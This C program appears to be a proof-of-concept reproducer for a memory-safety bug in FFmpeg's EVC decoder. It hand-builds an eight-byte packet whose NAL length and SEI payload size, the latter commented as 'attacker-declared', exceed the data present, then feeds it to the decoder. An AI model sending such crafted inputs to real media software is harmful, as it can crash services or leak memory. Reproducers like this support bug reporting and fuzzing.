#include <stdint.h>
#include <stdio.h>

#include "libavcodec/avcodec.h"

int main(void)
{
    const AVCodec *codec = avcodec_find_decoder_by_name("evc");
    AVCodecContext *ctx;
    AVPacket *pkt;
    AVFrame *frame;
    int ret;

    if (!codec)
        return 2;

    ctx = avcodec_alloc_context3(codec);
    pkt = av_packet_alloc();
    frame = av_frame_alloc();
    if (!ctx || !pkt || !frame)
        return 3;
    if (avcodec_open2(ctx, codec, NULL) < 0)
        return 4;
    if (av_new_packet(pkt, 8) < 0)
        return 5;

    /* Four-byte NAL length 256, but only four payload bytes follow. */
    pkt->data[0] = 0x00;
    pkt->data[1] = 0x00;
    pkt->data[2] = 0x01;
    pkt->data[3] = 0x00;
    /* SEI NAL header, payload type 5, attacker-declared payload size 100. */
    pkt->data[4] = 0x3a;
    pkt->data[5] = 0x00;
    pkt->data[6] = 0x05;
    pkt->data[7] = 0x64;

    ret = avcodec_send_packet(ctx, pkt);
    if (ret >= 0)
        ret = avcodec_receive_frame(ctx, frame);
    fprintf(stderr, "decoder result: %d\n", ret);

    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    return 0;
}
